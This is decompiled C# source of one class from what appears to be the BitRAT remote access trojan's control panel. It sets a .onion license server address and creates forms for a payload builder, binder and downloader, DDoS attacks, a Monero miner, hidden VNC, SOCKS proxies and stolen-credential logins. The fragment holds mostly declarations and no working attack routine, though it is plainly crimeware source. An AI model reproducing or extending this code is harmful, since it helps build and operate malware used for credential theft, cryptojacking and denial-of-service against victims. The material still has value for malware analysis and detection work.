﻿using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using BitRAT;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x020000F7 RID: 247
[StandardModule]
internal sealed class Class130
{
	// Token: 0x06000D25 RID: 3365 RVA: 0x00066298 File Offset: 0x00064498
	// Note: this type is marked as 'beforefieldinit'.
	static Class130()
	{
		string string_ = "http://unknownposdhmyrm.onion";
		Class130.struct3_6.method_3(string_);
		string string_2 = "/lic.php";
		Class130.struct3_7.method_3(string_2);
		string string_3 = "1.27";
		Class130.struct3_8.method_3(string_3);
		string string_4 = "CDE61C76846D06EC0612FD2A3D7A71E2BC908FD89601EA50C45E449EEC02B3A7";
		Class130.struct3_9.method_3(string_4);
	}

	// Token: 0x06000D26 RID: 3366
	[DllImport("user32")]
	public static extern bool ShowScrollBar(IntPtr intptr_0, int int_2, bool bool_0);

	// Token: 0x06000D27 RID: 3367
	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int SendMessageA(IntPtr intptr_0, int int_2, int int_3, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	// Token: 0x06000D28 RID: 3368
	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetScrollInfo(IntPtr intptr_0, int int_2, ref Class130.Struct21 struct21_0);

	// Token: 0x06000D29 RID: 3369
	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int SetScrollInfo(IntPtr intptr_0, int int_2, ref Class130.Struct21 struct21_0, bool bool_0);

	// Token: 0x040004EA RID: 1258
	public static fMain fMain_0 = new fMain();

	// Token: 0x040004EB RID: 1259
	public static fSettings fSettings_0 = new fSettings();

	// Token: 0x040004EC RID: 1260
	public static fConnectionLog fConnectionLog_0 = new fConnectionLog();

	// Token: 0x040004ED RID: 1261
	public static fBuilder fBuilder_0 = new fBuilder();

	// Token: 0x040004EE RID: 1262
	public static fBuilderBinder fBuilderBinder_0 = new fBuilderBinder();

	// Token: 0x040004EF RID: 1263
	public static fBuilderDownloader fBuilderDownloader_0 = new fBuilderDownloader();

	// Token: 0x040004F0 RID: 1264
	public static fCertificate fCertificate_0 = new fCertificate();

	// Token: 0x040004F1 RID: 1265
	public static fOnJoin fOnJoin_0 = new fOnJoin();

	// Token: 0x040004F2 RID: 1266
	public static fUpdate fUpdate_0 = new fUpdate();

	// Token: 0x040004F3 RID: 1267
	public static fHWIDUpdate fHWIDUpdate_0 = new fHWIDUpdate();

	// Token: 0x040004F4 RID: 1268
	public static fPayment fPayment_0 = new fPayment();

	// Token: 0x040004F5 RID: 1269
	public static fPaymentDDoS fPaymentDDoS_0 = new fPaymentDDoS();

	// Token: 0x040004F6 RID: 1270
	public static fPaymentHVNC fPaymentHVNC_0 = new fPaymentHVNC();

	// Token: 0x040004F7 RID: 1271
	public static fTransferManager fTransferManager_0 = new fTransferManager();

	// Token: 0x040004F8 RID: 1272
	public static fMinerXMR fMinerXMR_0 = new fMinerXMR();

	// Token: 0x040004F9 RID: 1273
	public static fDDOS fDDOS_0 = new fDDOS();

	// Token: 0x040004FA RID: 1274
	public static fSocks5 fSocks5_0 = new fSocks5();

	// Token: 0x040004FB RID: 1275
	public static fSocks4R fSocks4R_0 = new fSocks4R();

	// Token: 0x040004FC RID: 1276
	public static fTorConfig fTorConfig_0 = new fTorConfig();

	// Token: 0x040004FD RID: 1277
	public static fSplash fSplash_0 = new fSplash();

	// Token: 0x040004FE RID: 1278
	public static fMinerXMRLogManager fMinerXMRLogManager_0 = new fMinerXMRLogManager();

	// Token: 0x040004FF RID: 1279
	public static fCredentialsLogins fCredentialsLogins_0 = new fCredentialsLogins();

	// Token: 0x04000500 RID: 1280
	public static long long_0;

	// Token: 0x04000501 RID: 1281
	public static Class130.Struct20 struct20_0 = default(Class130.Struct20);

	// Token: 0x04000502 RID: 1282
	public static long long_1;

	// Token: 0x04000503 RID: 1283
	public static ConcurrentDictionary<string, cTransfer> concurrentDictionary_0 = new ConcurrentDictionary<string, cTransfer>();

	// Token: 0x04000504 RID: 1284
	public static ConcurrentDictionary<string, int> concurrentDictionary_1 = new ConcurrentDictionary<string, int>();

	// Token: 0x04000505 RID: 1285
	public static ConcurrentDictionary<string, cLogCon> concurrentDictionary_2 = new ConcurrentDictionary<string, cLogCon>();

	// Token: 0x04000506 RID: 1286
	public static ConcurrentDictionary<string, CClient> concurrentDictionary_3 = new ConcurrentDictionary<string, CClient>();

	// Token: 0x04000507 RID: 1287
	public static ConcurrentDictionary<string, cMinerXMRcli> concurrentDictionary_4 = new ConcurrentDictionary<string, cMinerXMRcli>();

	// Token: 0x04000508 RID: 1288
	public static ConcurrentDictionary<string, cDOScli> concurrentDictionary_5 = new ConcurrentDictionary<string, cDOScli>();

	// Token: 0x04000509 RID: 1289
	public static ConcurrentDictionary<string, cSocks5cli> concurrentDictionary_6 = new ConcurrentDictionary<string, cSocks5cli>();

	// Token: 0x0400050A RID: 1290
	public static ConcurrentDictionary<string, cSocks4Rcli> concurrentDictionary_7 = new ConcurrentDictionary<string, cSocks4Rcli>();

	// Token: 0x0400050B RID: 1291
	public static ConcurrentDictionary<string, cCredentialsUser> concurrentDictionary_8 = new ConcurrentDictionary<string, cCredentialsUser>();

	// Token: 0x0400050C RID: 1292
	public static ConcurrentDictionary<string, cFWIP> concurrentDictionary_9 = new ConcurrentDictionary<string, cFWIP>();

	// Token: 0x0400050D RID: 1293
	public static ConcurrentDictionary<string, string> concurrentDictionary_10 = new ConcurrentDictionary<string, string>();

	// Token: 0x0400050E RID: 1294
	public static int int_0;

	// Token: 0x0400050F RID: 1295
	public static IPAddress ipaddress_0;

	// Token: 0x04000510 RID: 1296
	public static int int_1;

	// Token: 0x04000511 RID: 1297
	public static IPAddress ipaddress_1;

	// Token: 0x04000512 RID: 1298
	public static ConcurrentQueue<cFWIP> concurrentQueue_0 = new ConcurrentQueue<cFWIP>();

	// Token: 0x04000513 RID: 1299
	public static ConcurrentQueue<cFWIP> concurrentQueue_1 = new ConcurrentQueue<cFWIP>();

	// Token: 0x04000514 RID: 1300
	public static ConcurrentQueue<cFWIP> concurrentQueue_2 = new ConcurrentQueue<cFWIP>();

	// Token: 0x04000515 RID: 1301
	public static TcpListener tcpListener_0;

	// Token: 0x04000516 RID: 1302
	public static TcpListener tcpListener_1;

	// Token: 0x04000517 RID: 1303
	public static ImageList imageList_0 = new ImageList
	{
		ImageSize = new Size(16, 12)
	};

	// Token: 0x04000518 RID: 1304
	public static ImageList imageList_1 = new ImageList
	{
		ImageSize = new Size(256, 160)
	};

	// Token: 0x04000519 RID: 1305
	public static Struct18 struct18_0;

	// Token: 0x0400051A RID: 1306
	public static Struct7 struct7_0;

	// Token: 0x0400051B RID: 1307
	public static Struct18 struct18_1;

	// Token: 0x0400051C RID: 1308
	public static Struct7 struct7_1;

	// Token: 0x0400051D RID: 1309
	public static Socket socket_0 = null;

	// Token: 0x0400051E RID: 1310
	public static Struct18 struct18_2;

	// Token: 0x0400051F RID: 1311
	public static Struct18 struct18_3;

	// Token: 0x04000520 RID: 1312
	public static Struct3 struct3_0;

	// Token: 0x04000521 RID: 1313
	public static Struct18 struct18_4;

	// Token: 0x04000522 RID: 1314
	public static Struct7 struct7_2;

	// Token: 0x04000523 RID: 1315
	public static Process process_0;

	// Token: 0x04000524 RID: 1316
	public static Process process_1;

	// Token: 0x04000525 RID: 1317
	public static Struct18 struct18_5;

	// Token: 0x04000526 RID: 1318
	public static Struct18 struct18_6;

	// Token: 0x04000527 RID: 1319
	public static Struct18 struct18_7;

	// Token: 0x04000528 RID: 1320
	public static Struct18 struct18_8;

	// Token: 0x04000529 RID: 1321
	public static Struct18 struct18_9;

	// Token: 0x0400052A RID: 1322
	public static long long_2;

	// Token: 0x0400052B RID: 1323
	public static long long_3;

	// Token: 0x0400052C RID: 1324
	public static Struct3 struct3_1 = new Struct3("m-X60m-X60");

	// Token: 0x0400052D RID: 1325
	public static Struct3 struct3_2 = new Struct3("m-X60m-X60");

	// Token: 0x0400052E RID: 1326
	public static Struct3 struct3_3 = new Struct3("m-X60m-X60");

	// Token: 0x0400052F RID: 1327
	public static Struct3 struct3_4 = new Struct3("m-X60m-X60");

	// Token: 0x04000530 RID: 1328
	public static Struct3 struct3_5 = new Struct3("m-X60m-X60");

	// Token: 0x04000531 RID: 1329
	public static Struct3 struct3_6;

	// Token: 0x04000532 RID: 1330
	public static Struct3 struct3_7;

	// Token: 0x04000533 RID: 1331
	public static Struct7 struct7_3;

	// Token: 0x04000534 RID: 1332
	public static Struct18 struct18_10;

	// Token: 0x04000535 RID: 1333
	public static Struct18 struct18_11;

	// Token: 0x04000536 RID: 1334
	public static Struct18 struct18_12;

	// Token: 0x04000537 RID: 1335
	public static Struct3 struct3_8;

	// Token: 0x04000538 RID: 1336
	public static Struct18 struct18_13;

	// Token: 0x04000539 RID: 1337
	public static Mutex mutex_0;

	// Token: 0x0400053A RID: 1338
	public static cIPInfo.STRUCT_GEO[] struct_GEO_0;

	// Token: 0x0400053B RID: 1339
	public static Struct3 struct3_9;

	// Token: 0x0400053C RID: 1340
	public static long long_4;

	// Token: 0x020000F8 RID: 248
	public enum Enum3
	{

	}

	// Token: 0x020000F9 RID: 249
	public struct Struct19
	{
		// Token: 0x0400053E RID: 1342
		public long long_0;

		// Token: 0x0400053F RID: 1343
		public long long_1;
	}

	// Token: 0x020000FA RID: 250
	public struct Struct20
	{
		// Token: 0x04000540 RID: 1344
		public double double_0;

		// Token: 0x04000541 RID: 1345
		public double double_1;

		// Token: 0x04000542 RID: 1346
		public double double_2;

		// Token: 0x04000543 RID: 1347
		public double double_3;

		// Token: 0x04000544 RID: 1348
		public double double_4;

		// Token: 0x04000545 RID: 1349
		public double double_5;
	}

	// Token: 0x020000FB RID: 251
	public struct Struct21
	{
		// Token: 0x04000546 RID: 1350
		public int int_0;

		// Token: 0x04000547 RID: 1351
		public int int_1;

		// Token: 0x04000548 RID: 1352
		public int int_2;

		// Token: 0x04000549 RID: 1353
		public int int_3;

		// Token: 0x0400054A RID: 1354
		public int int_4;

		// Token: 0x0400054B RID: 1355
		public int int_5;

		// Token: 0x0400054C RID: 1356
		public int int_6;
	}
}
